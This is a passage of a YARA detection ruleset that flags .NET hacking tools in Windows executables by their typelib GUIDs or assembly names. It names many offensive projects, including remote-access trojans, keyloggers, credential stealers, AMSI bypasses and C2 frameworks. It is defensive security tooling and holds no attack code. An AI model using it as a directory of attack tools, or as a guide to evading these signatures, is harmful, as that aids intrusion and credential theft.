    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SuperSQLInjectionV1 {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/shack2/SuperSQLInjectionV1"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "d5688068-fc89-467d-913f-037a785caca7" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ADSearch {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/tomcarver16/ADSearch"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "4da5f1b7-8936-4413-91f7-57d6e072b4a7" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_privilege_escalation_awesome_scripts_suite {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "1928358e-a64b-493f-a741-ae8e3d029374" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CVE_2020_1206_POC {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/ZecOps/CVE-2020-1206-POC"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "3523ca04-a12d-4b40-8837-1a1d28ef96de" ascii nocase wide
        $typelibguid1 = "d3a2f24a-ddc6-4548-9b3d-470e70dbcaab" ascii nocase wide
        $typelibguid2 = "fb30ee05-4a35-45f7-9a0a-829aec7e47d9" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DInvoke {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/TheWover/DInvoke"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "b77fdab5-207c-4cdb-b1aa-348505c54229" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpChisel {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/shantanu561993/SharpChisel"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "f5f21e2d-eb7e-4146-a7e1-371fd08d6762" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpScribbles {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/V1V1/SharpScribbles"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "aa61a166-31ef-429d-a971-ca654cd18c3b" ascii nocase wide
        $typelibguid1 = "0dc1b824-c6e7-4881-8788-35aecb34d227" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpReg {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/jnqpblc/SharpReg"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "8ef25b00-ed6a-4464-bdec-17281a4aa52f" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_MemeVM {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/TobitoFatitoRE/MemeVM"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "ef18f7f2-1f03-481c-98f9-4a18a2f12c11" ascii nocase wide
        $typelibguid1 = "77b2c83b-ca34-4738-9384-c52f0121647c" ascii nocase wide
        $typelibguid2 = "14d5d12e-9a32-4516-904e-df3393626317" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpDir {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/jnqpblc/SharpDir"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "c7a07532-12a3-4f6a-a342-161bb060b789" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AtYourService {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/mitchmoser/AtYourService"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "bc72386f-8b4c-44de-99b7-b06a8de3ce3f" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_LockLess {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/GhostPack/LockLess"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "a91421cb-7909-4383-ba43-c2992bbbac22" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_EasyNet {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/TheWover/EasyNet"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "3097d856-25c2-42c9-8d59-2cdad8e8ea12" ascii nocase wide
        $typelibguid1 = "ba33f716-91e0-4cf7-b9bd-b4d558f9a173" ascii nocase wide
        $typelibguid2 = "37d6dd3f-5457-4d8b-a2e1-c7b156b176e5" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpByeBear {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/S3cur3Th1sSh1t/SharpByeBear"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "a6b84e35-2112-4df2-a31b-50fde4458c5e" ascii nocase wide
        $typelibguid1 = "3e82f538-6336-4fff-aeec-e774676205da" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpHide {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/outflanknl/SharpHide"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "443d8cbf-899c-4c22-b4f6-b7ac202d4e37" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpSvc {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/jnqpblc/SharpSvc"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "52856b03-5acd-45e0-828e-13ccb16942d1" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpCrashEventLog {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/slyd0g/SharpCrashEventLog"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "98cb495f-4d47-4722-b08f-cefab2282b18" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DotNetToJScript_LanguageModeBreakout {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/FuzzySecurity/DotNetToJScript-LanguageModeBreakout"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "deadb33f-fa94-41b5-813d-e72d8677a0cf" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharPermission {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/mitchmoser/SharPermission"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "84d2b661-3267-49c8-9f51-8f72f21aea47" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_RegistryStrikesBack {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/mdsecactivebreach/RegistryStrikesBack"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "90ebd469-d780-4431-9bd8-014b00057665" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CloneVault {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/mdsecactivebreach/CloneVault"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "0a344f52-6780-4d10-9a4a-cb9439f9d3de" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_donut {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/TheWover/donut"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "98ca74c7-a074-434d-9772-75896e73ceaa" ascii nocase wide
        $typelibguid1 = "3c9a6b88-bed2-4ba8-964c-77ec29bf1846" ascii nocase wide
        $typelibguid2 = "4fcdf3a3-aeef-43ea-9297-0d3bde3bdad2" ascii nocase wide
        $typelibguid3 = "361c69f5-7885-4931-949a-b91eeab170e3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpHandler {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/jfmaes/SharpHandler"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "46e39aed-0cff-47c6-8a63-6826f147d7bd" ascii nocase wide
        $typelibguid1 = "11dc83c6-8186-4887-b228-9dc4fd281a23" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Driver_Template {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/FuzzySecurity/Driver-Template"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "bdb79ad6-639f-4dc2-8b8a-cd9107da3d69" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_NashaVM {
    meta:
        description = "Detects .NET red/black-team tools via typelibguid"
        reference = "https://github.com/Mrakovic-ORG/NashaVM"
        author = "Arnim Rupp"
        date = "2021-01-21"
    strings:
        $typelibguid0 = "f9e63498-6e92-4afd-8c13-4f63a3d964c3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or
    organization, as long as you use it under this license.
*/


// low hanging fruits ;)

rule HKTL_NET_NAME_FakeFileMaker {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/DamonMohammadbagher/FakeFileMaker"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "FakeFileMaker" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_Aggressor {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/k8gege/Aggressor"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "Aggressor" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_pentestscripts {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/c4bbage/pentestscripts"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "pentestscripts" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_WMIPersistence {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/mdsecactivebreach/WMIPersistence"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "WMIPersistence" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_ADCollector {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/dev-2null/ADCollector"
        hash = "5391239f479c26e699b6f3a1d6a0a8aa1a0cf9a8"
        hash = "9dd0f322dd57b906da1e543c44e764954704abae"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "ADCollector" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_MaliciousClickOnceGenerator {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/Mr-Un1k0d3r/MaliciousClickOnceGenerator"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "MaliciousClickOnceGenerator" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_directInjectorPOC {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/badBounty/directInjectorPOC"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "directInjectorPOC" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_AsStrongAsFuck {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/Charterino/AsStrongAsFuck"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "AsStrongAsFuck" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_MagentoScanner {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/soufianetahiri/MagentoScanner"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "MagentoScanner" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_RevengeRAT_Stub_CSsharp {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/NYAN-x-CAT/RevengeRAT-Stub-CSsharp"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "RevengeRAT-Stub-CSsharp" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_SharPyShell {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/antonioCoco/SharPyShell"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "SharPyShell" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_GhostLoader {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/TheWover/GhostLoader"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "GhostLoader" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_DotNetInject {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/dtrizna/DotNetInject"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "DotNetInject" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_ATPMiniDump {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/b4rtik/ATPMiniDump"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "ATPMiniDump" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_ConfuserEx {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/yck1509/ConfuserEx"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "ConfuserEx" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_SharpBuster {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/passthehashbrowns/SharpBuster"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "SharpBuster" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_AmsiBypass {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/0xB455/AmsiBypass"
		hash = "8fa4ba512b34a898c4564a8eac254b6a786d195b"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "AmsiBypass" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_Recon_AD {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/outflanknl/Recon-AD"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "Recon-AD" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_SharpWatchdogs {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/RITRedteam/SharpWatchdogs"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "SharpWatchdogs" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_SharpCat {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/Cn33liz/SharpCat"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "SharpCat" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_aspnetcore_bypassing_authentication {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/jackowild/aspnetcore-bypassing-authentication"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "aspnetcore-bypassing-authentication" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_K8tools {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/k8gege/K8tools"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "K8tools" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_HTTPSBeaconShell {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/limbenjamin/HTTPSBeaconShell"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "HTTPSBeaconShell" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_Ghostpack_CompiledBinaries {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "Ghostpack-CompiledBinaries" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_metasploit_sharp {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/VolatileMindsLLC/metasploit-sharp"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "metasploit-sharp" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_trevorc2 {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/trustedsec/trevorc2"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "trevorc2" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_petaqc2 {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/fozavci/petaqc2"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "petaqc2" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_NativePayload_DNS2 {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/DamonMohammadbagher/NativePayload_DNS2"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "NativePayload_DNS2" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_cve_2017_7269_tool {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/zcgonvh/cve-2017-7269-tool"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "cve-2017-7269-tool" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_AggressiveProxy {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/EncodeGroup/AggressiveProxy"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "AggressiveProxy" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_MSBuildAPICaller {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/rvrsh3ll/MSBuildAPICaller"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "MSBuildAPICaller" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_GrayKeylogger {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/DarkSecDevelopers/GrayKeylogger"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "GrayKeylogger" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_weevely3 {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/epinna/weevely3"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "weevely3" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_FudgeC2 {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/Ziconius/FudgeC2"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "FudgeC2" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_NativePayload_Reverse_tcp {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "NativePayload_Reverse_tcp" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_SharpHose {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/ustayready/SharpHose"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "SharpHose" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_RAT_NjRat_0_7d_modded_source_code {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/AliBawazeEer/RAT-NjRat-0.7d-modded-source-code"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "RAT-NjRat-0.7d-modded-source-code" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_RdpThief {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/0x09AL/RdpThief"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "RdpThief" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_RunasCs {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/antonioCoco/RunasCs"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "RunasCs" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_NativePayload_IP6DNS {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/DamonMohammadbagher/NativePayload_IP6DNS"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "NativePayload_IP6DNS" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_NativePayload_ARP {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/DamonMohammadbagher/NativePayload_ARP"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "NativePayload_ARP" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_C2Bridge {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/cobbr/C2Bridge"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "C2Bridge" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_Infrastructure_Assessment {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/NyaMeeEain/Infrastructure-Assessment"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "Infrastructure-Assessment" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_shellcodeTester {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/tophertimzen/shellcodeTester"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "shellcodeTester" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_gray_hat_csharp_code {
    meta:
